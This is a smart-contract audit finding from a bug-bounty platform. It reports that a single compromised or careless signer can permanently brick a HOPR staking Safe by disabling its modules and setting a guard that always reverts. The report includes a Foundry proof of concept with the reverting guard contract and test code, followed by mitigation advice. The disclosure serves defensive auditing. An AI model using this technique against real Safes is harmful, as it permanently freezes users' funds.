# [H] Safe can be permanently bricked if a broken guard were set

## Summary
Severity: High
Chain: Smart contract
Component: SafeStaking-by-HOPR
Published: 2023-10-11
Source: https://github.com/hats-finance/SafeStaking-by-HOPR-0x607386df18b663cf5ee9b879fbc1f32466ad5a85/issues/26
Type: hats-finding

## Details
**Github username:** @0xfuje
**Submission hash (on-chain):** 0x4883a703a6b6715810472be32412197600cabfee3a0c1bd9d9acb697792f3cc4
**Severity:** high

**Description:**
## Impact
User funds can be permanently frozen in `Safe`.`Safe` is only accessible from `modules` set before `guard`. 

## Description
Owner of a `Safe` can setup a guard contract that executes functions before every `Safe` transaction

`vendor/solidity/safe-contracts-1.4.1/contracts/Safe.sol` - [`execTransaction()`](https://github.com/hats-finance/SafeStaking-by-HOPR-0x607386df18b663cf5ee9b879fbc1f32466ad5a85/blob/master/vendor/solidity/safe-contracts-1.4.1/contracts/Safe.sol#L174-L177)
```solidity
        address guard = getGuard();
        {
            if (guard != address(0)) {
                Guard(guard).checkTransaction(
                // Transaction info
```
and after every `Safe` transactions
```solidity
		if (guard != address(0)) {
		    Guard(guard).checkAfterExecution(txHash, success);
		}
```
If the guard `check` functions revert for any reason, all of the `Safe` calls that are not executed from modules will revert. Since the guard setup is protected by `authorized` it can only be called by a `Safe` transaction, so it will revert as well. 

The `Safe` setup has been initialized with a `threshold` of one, so a single signer can:
1. accidentally set up a `guard` that will revert
2. intentionally set up a `guard` or be compromised to set up a `guard` that will revert

### Accidental setup
The good news is that in case the broken `guard` were set accidentally: the base module `HoprNodeManagementModule` is set up at initialization of the `Safe` and is still allowed to operate via `execTransactionFromModule()` and can also be upgraded to safe the user funds from the bricked `Safe`.

### Malicious signer
However in case one of the signers turn malicious: he can disable all `modules` like the `HoprNodeManagementModule`. This will make sure funds are permanently frozen after he sets up a reverting `guard`. Since private key compromises are in scope: and a single signer can execute this (because the `threshold` is set to one) I consider this a high severity vulnerability.

## Proof of Concept
1. create a new file in `packages/ethereum/contracts/test/mocks/GuardMock.sol`
```solidity
pragma solidity >=0.7.0 <0.9.0;

import {BaseGuard} from "safe-contracts/base/GuardManager.sol";
import "safe-contracts/common/Enum.sol";

contract GuardMock is BaseGuard {
    function checkTransaction(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures,
        address msgSender
    ) external override {
        string memory hello = "Your safe is bricked forever";
        revert(hello);
    }

    function checkAfterExecution(
        bytes32 txHash,
        bool success
    ) external override {
        string memory hello = "Your safe is bricked forever";
        revert(hello);
    }
}
```
2. navigate to `packages/ethereum/contracts/test/node-stake/NodeStakeFactory.t.sol`
3. import the following contracts in the top of the file:
```solidity
import { GuardMock } from "../mocks/GuardMock.sol";
import { GuardManager } from "safe-contracts/base/GuardManager.sol";
import { ModuleManager } from "safe-contracts/base/ModuleManager.sol";
```
4. copy and paste the below proof of concept inside `HoprNodeStakeFactoryTest` (includes a helper function to execute safe transactions that expects reverts if set to true)
5. run `forge test --match-test test_GuardDosSafe -vvvv`
```solidity
    function test_GuardDosSafe() public {
        address channels = 0x0101010101010101010101010101010101010101;
        address token = 0x1010101010101010101010101010101010101010;
        vm.mockCall(channels, abi.encodeWithSignature("token()"), abi.encode(token));
        
        address[] memory admins = new address[](10);
        for (uint256 i = 0; i < admins.length; i++) {
            admins[i] = vm.addr(200 + i);
        }

        vm.prank(caller);
        (module, safe) = factory.clone(
            address(moduleSingleton),
            admins,
            0,
            bytes32(hex"0101010101010101010101010101010101010101010101010101010101010101")
        );
        // SETUP END


        // 1. one of the admins deploys the new guard
        vm.prank(admins[8]);
        GuardMock guard = new GuardMock();

        // 2. since threshold is one a single admin can execute transactions
        // admin sets a guard that either accidentally or intentionally will revert 
        executeSafeTxHelper(admins[8], Safe(safe), safe, 1, abi.encodeWithSelector(GuardManager.setGuard.selector, address(guard)), false);

        // 3. safe is dos-ed, no transactions can be executed anymore
        // a module could have been setup that can still execute transactions and save the safe however since all calls will fail, it can't be enabled
        address saverModule = vm.addr(8888);
        
        // 3.1 setting a saver module will revert
        executeSafeTxHelper(admins[8], Safe(safe), safe, 2, abi.encodeWithSelector(ModuleManager.enableModule.selector, address(saverModule)), true);

        // 3.2 disabling the guard via setting a new safe one will revert
        address safeGuard = vm.addr(4444);
        executeSafeTxHelper(admins[8], Safe(safe), safe, 2, abi.encodeWithSelector(GuardManager.setGuard.selector, address(safeGuard)), true);

        // 3.3 any other calls will revert
        executeSafeTxHelper(admins[8], Safe(safe), channels, 2,  abi.encodeWithSignature("token()"), true);
    }

	// HELPER FUNCTION
    // modified from prepareSafeTx in NodeStakeFactory
    function executeSafeTxHelper(address from, Safe safeAddress, address to, uint256 nonce, bytes memory data, bool expectRevert) public {
        vm.startPrank(from);

        bytes32 r = bytes32(uint256(uint160(address(from))));

        bytes32 dataHash =
        safeAddress.getTransactionHash(to, 0, data, Enum.Operation.Call, 0, 0, 0, address(0), msg.sender, nonce);
        safeAddress.approveHash(dataHash);

        if (expectRevert) {
            vm.expectRevert("Your safe is bricked forever");
        }
        
        safeAddress.execTransaction(
            to,
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(msg.sender)),
            abi.encodePacked(abi.encode(r, bytes32(0)), bytes1(hex"01"))
        );

        vm.stopPrank();
    }
```

## Recommended Mitigation
Consider developing recovery logic in `HoprNodeMagamentModule` that allows to safe funds in case of a broken `guard`. Consider developing `Hopr`'s own guard for further safety of the protocol that will also disallow setting any other `guard` that could be broken or malicious.
